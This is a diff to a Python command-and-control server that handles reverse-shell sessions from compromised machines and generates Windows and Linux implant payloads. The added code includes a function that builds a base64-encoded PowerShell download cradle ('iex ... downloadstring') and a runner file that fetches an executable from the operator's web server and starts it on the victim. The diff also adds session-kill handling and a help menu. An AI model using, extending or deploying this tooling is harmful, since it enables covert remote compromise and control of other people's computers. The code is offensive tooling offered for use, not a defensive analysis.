@@ -1,6 +1,7 @@
 from datetime import datetime
 from prettytable import PrettyTable
 
+import base64
 import os
 import random
 import shutil
@@ -37,6 +38,25 @@ def banner():
     print(bcolors.HEADER + bcolors.BOLD + '\nBy HK Transfield' + bcolors.ENDC)
     print(bcolors.HEADER + '=============================================\n' + bcolors.ENDC)
 
+def help():
+    print('''
+
+    Menu Commands
+    ----------------------------------------------------------------------------------------
+    listeners -g            ---> Generate a new listener
+    winplant py             ---> Generate a Windows compatible Python payload
+    unixplant py            ---> Generate a Linux compatible Python payload
+    exeplant                ---> Generate an executable payload for windows
+    sessions -l             ---> List sessions
+    sessions -i <id>        ---> Interact with a new sessions
+    kill <id>               ---> Kills an active session
+
+    Session Commands
+    ----------------------------------------------------------------------------------------
+    background              ---> Backgrounds the current session
+    exit                    ---> Terminates the current session
+    ''')
+
 def comm_in(target_id):
     """ Handles all responses sent from a sockclient.
 
@@ -60,6 +80,16 @@ def comm_out(target_id, message):
     message = str(message)
     target_id.send(message.encode())
 
+def kill_signal(target_id, message):
+    """ Sends commands from the sockserver to a sockclient.
+
+    Args:
+        target_id (int): _description_
+        message (string): _description_
+    """
+    message = str(message)
+    target_id.send(message.encode())
+
 def target_comm(target_id, targets, num):
     """ Manages the command and traffic control.
 
@@ -67,7 +97,11 @@ def target_comm(target_id, targets, num):
         target_id (int): _description_
     """
     while True:
-        message = input('[*] Message to send > ')
+        message = input(bcolors.OKBLUE + f'{targets[num][3]}/{targets[num][1]}#> ' + bcolors.ENDC)
+        if len(message) == 0:
+            continue
+        if message == 'help':
+            pass
         comm_out(target_id, message)
 
         if message == 'exit':
@@ -164,6 +198,39 @@ def comm_handler():
                 print(bcolors.OKGREEN + f'\n[+] Connection received from {remote_ip[0]}\n' + bcolors.ENDC + 'Enter command $ ',end='')
         except:
             pass
+
+def powershell_cradle():
+    """ Download a payload on a remote Windows machine in order to execute and get a
+        return sessions. Generates an encoded PowerShell download cradle.
+    """
+
+    # specify the IP and port that will run a webserver on
+    web_server_ip = input('[+] Web server listening host: ')
+    web_server_port = input('[+] Web server port: ')
+
+    payload_name = input('[+] Payload name: ')
+
+    # create powershell runner containing the command string used to
+    # download the file itself and execute
+    runner_file = (''.join(random.choices(string.ascii_lowercase,k=6)))
+    runner_file = f'{runner_file}.txt'
+
+    randomised_exe_file = (''.join(random.choices(string.ascii_lowercase,k=6)))
+    randomised_exe_file = f'{randomised_exe_file}.exe'
+
+    print('[+] Run the following command to start a web server: ' + bcolors.BOLD + f'\npython3 -m http.server -b {web_server_ip} {web_server_port}')
+
+    runner_cal_unencoded = f"iex (new-object net.webclient).downloadstring('http://{web_server_ip}:{web_server_port}/{runner_file}')".encode('utf-16le')
+    with open(runner_file, 'w') as f:
+        f.write(f'powershell -c wget http://{web_server_ip}:{web_server_port}/{payload_name} -outfile {randomised_exe_file}; Start-Process -FilePath {randomised_exe_file}')
+        f.close()
+    b64_runner_cal = base64.b64encode(runner_cal_unencoded)
+    b64_runner_cal = b64_runner_cal.decode()
+    print(f'\n[+] Encoded payload\n\npowershell -e {b64_runner_cal}')
+    b64_runner_cal_decoded = base64.b64decode(b64_runner_cal).decode()
+    print(f'\n[+] Unencoded payload\n\n{b64_runner_cal_decoded}')
+
+
 ### PAYLOADS ###
 def winplant():
 
@@ -275,11 +342,17 @@ if __name__ == '__main__':
         try:
             command = input('Enter command $ ')
 
+            if command == 'help':
+                help()
+
             if command == 'listeners -g':
                 host_ip = input('[+] Enter the IP to listen to: ')
                 host_port = input('[+] Enter the port to listen on: ')
                 listener_handler()
                 listener_counter += 1
+
+            if command == 'pshell_shell':
+                powershell_cradle()
 
             if command == 'winplant py':
                 if listener_counter > 0:
@@ -298,6 +371,35 @@ if __name__ == '__main__':
                     exeplant()
                 else:
                     print(bcolors.WARNING + '[-] You cannot generate an exe payload without an active listener' + bcolors.ENDC)
+
+            if command == 'exit':
+                quit_message = input(bcolors.WARNING + '\n[+] Are you sure you want to quit? (y/n) ' + bcolors.ENDC)
+                if quit_message == 'y':
+                    len_targets = len(targets)
+                    for target in targets:
+                        if target[7] == 'Dead':
+                            pass
+                        else:
+                            comm_out(target[0], 'exit')
+                    kill_flag = 1
+                    if listener_counter > 0:
+                        sock.close()
+                    break
+                else:
+                    continue
+
+            if command.split(" ")[0] == 'kill':
+                    try:
+                        num = int(command.split(" ")[1])
+                        target_id = (targets[num])[0]
+                        if (targets[num])[7] == 'Active':
+                            kill_signal(target_id, 'exit')
+                            targets[num][7] = 'Dead'
+                            print(f'[+] Sessions {num} terminated.')
+                        else:
+                            print(bcolors.WARNING + '[-] You cannot interact with a dead session.' + bcolors.ENDC)
+                    except (IndexError, ValueError):
+                        print(bcolors.FAIL + f'[-] Session {num} does not exist.' + bcolors.ENDC)
 
             if command.split(" ")[0] == 'sessions':
                 session_counter = 0
@@ -336,7 +438,7 @@ if __name__ == '__main__':
                     try:
                         num = int(command.split(" ")[2])
                         target_id = (targets[num])[0]
-                        if (targets[num])[7] == 'Active':
+                        if 'Active' in (targets[num])[7]:
                             target_comm(target_id, targets, num)
                         else:
                             print(
@@ -345,7 +447,8 @@ if __name__ == '__main__':
                                 'WARNING: ' +
                                 bcolors.ENDC +
                                 bcolors.WARNING +
-                                'You cannot interact with a dead session'
+                                'You cannot interact with a dead session' +
+                                bcolors.ENDC
                             )
                     except IndexError:
                         print(bcolors.FAIL + f'[-] Session {num} does not exist.' + bcolors.ENDC)
